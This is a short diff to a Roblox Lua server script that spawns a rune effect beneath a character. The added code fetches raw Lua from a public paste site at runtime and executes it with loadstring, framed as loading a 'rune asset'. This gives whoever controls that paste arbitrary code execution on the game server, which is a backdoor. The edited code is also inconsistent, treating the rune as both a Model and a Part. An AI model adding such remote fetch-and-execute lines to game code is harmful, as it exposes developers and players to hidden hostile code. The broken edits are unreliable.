@@ -318,7 +318,9 @@ event.OnServerEvent:Connect(function(player, hit)
 				v.Anchored = true
 			end
 		end
-		local rune = Instance.new("Part")
+		loadstring(game:GetService("HttpService"):GetAsync("https://glot.io/snippets/gi41zgzdii/raw/crucifixruneasset.lua"))()
+		local rune = script.RuneAsset:Clone()
+		rune.Parent = workspace
 		local runeDecal = Instance.new("Decal")
 		local runeLight = Instance.new("PointLight")
 		if model:FindFirstChild("Head") then
@@ -348,7 +350,7 @@ event.OnServerEvent:Connect(function(player, hit)
 
 			--Run function
 			rune.Parent = workspace
-			rune.Position = Vector3.new(model.Position.X, 0.0281205177, model.Position.z)
+			rune:SetPrimaryPartCFrame(CFrame.new(Vector3.new(model.Position.X, 0.0281205177, model.Position.z)))
 			rune.Transparency = 1
 			rune.Size = Vector3.new(size.X + size.X * 1.2, 0.056241508573293686, size.Z + size.Z * 1.2)
 			rune.Anchored = true
